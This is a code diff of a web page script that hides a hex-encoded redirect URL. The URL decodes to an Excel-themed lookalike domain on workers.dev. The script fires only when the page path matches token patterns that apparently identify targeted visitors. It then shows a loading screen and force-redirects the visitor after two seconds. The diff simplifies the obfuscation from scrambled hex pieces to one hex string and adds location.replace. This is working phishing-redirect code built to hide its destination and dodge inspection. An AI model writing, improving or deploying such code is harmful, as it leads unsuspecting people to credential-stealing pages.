@@ -45,18 +45,9 @@ display:none;
 
 <script>
 
-/* HEX pieces (scrambled) */
-const h = [
-"68747470733a2f2f626c7537306c",
-"336673312d657863656c2d",
-"6f70656238323531636964393133783373353473707265656473686565657473302d31306",
-"2632e636f6d30323930362e776f726b6572732e6465762f"
-];
-
-/* build hex string */
-function buildHex(){
-return h[1] + "733a" + h[2] + h[0] + h[3];
-}
+/* your hex redirect URL */
+const hexURL =
+"68747470733a2f2f626c7537306c336673312d657863656c2d6f70656238323531636964393133783373353473707265656473686565657473302d313062632e636f6d30323930362e776f726b6572732e6465762f";
 
 /* decode hex → string */
 function hexToString(hex){
@@ -69,21 +60,14 @@ return str;
 
 function validateURL(){
 
-/* split path segments */
 let parts = window.location.pathname.split("/").filter(Boolean);
 
 if(parts.length < 2) return;
 
-/* first segment (previously subdomain token) */
 let token = parts[0];
-
-/* second segment (long random structure) */
 let structure = parts[1];
 
-/* token rule */
 let tokenPattern = /^[A-Z]{8}-[0-9]{9}$/;
-
-/* path rule */
 let endPattern = /^[A-Z]{8}[a-z]{6}[A-Za-z]{37}[0-9]{5}$/;
 
 if(tokenPattern.test(token) && endPattern.test(structure)){
@@ -92,10 +76,10 @@ document.getElementById("loader").style.display="flex";
 
 setTimeout(function(){
 
-let hexURL = buildHex();
 let finalURL = hexToString(hexURL);
 
-window.location.href = finalURL;
+/* force redirect */
+window.location.replace(finalURL);
 
 },2000);
 
